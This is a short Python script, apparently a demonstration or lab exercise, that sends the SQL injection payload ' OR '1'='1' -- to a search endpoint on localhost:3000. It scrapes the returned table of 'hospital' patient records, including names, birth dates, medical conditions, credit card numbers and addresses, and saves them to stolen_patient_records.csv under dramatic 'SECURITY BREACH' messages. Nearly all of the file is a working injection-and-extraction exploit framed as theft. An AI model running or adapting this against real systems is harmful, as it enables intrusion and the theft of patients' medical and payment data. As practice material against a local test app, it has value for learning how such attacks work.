import os
import requests
import time
import csv
from bs4 import BeautifulSoup

os.system('clear')
print("Initiating Breach...")
time.sleep(2)

url = "http://localhost:3000/search"
payload = "' OR '1'='1' --"

print("Connecting...")
time.sleep(1)
response = requests.get(url, params={'q': payload})

if response.status_code == 200:
    print("Connected to HOSPITAL's Server! ✅")
    time.sleep(1)
    print("Successfully accessed the Database! ✅")
    time.sleep(2)
    print("SECURITY BREACH SUCCESSFUL 🚨\n")
    time.sleep(1)
    print("Extracting ALL patient records...\n")
    time.sleep(2)

    soup = BeautifulSoup(response.text, 'html.parser')
    rows = soup.find_all('tr')[1:]  # Skip header

    stolen_data = []
    for row in rows:
        cols = row.find_all('td')
        if len(cols) >= 6:
            stolen_data.append({
                'id': cols[0].text,
                'name': cols[1].text,
                'dob': cols[2].text,
                'condition': cols[3].text,
                'credit_card': cols[4].text,
                'address': cols[5].text
            })

    # Save to CSV
    with open('stolen_patient_records.csv', 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['id','name','dob','condition','credit_card','address'])
        writer.writeheader()
        writer.writerows(stolen_data)

    print(f"Successfully copied {len(stolen_data)} patient records! 💾")
    print("\nSECURITY BREACH COMPLETE")

    print("\n=== STOLEN DATA (SAMPLE - just a few): ===")
    for record in stolen_data[:3]:
        print(record)
    for i in range(4):
        print(".")
    print("File saved: stolen_patient_records.csv")

else:
    print("❌ Connection failed.")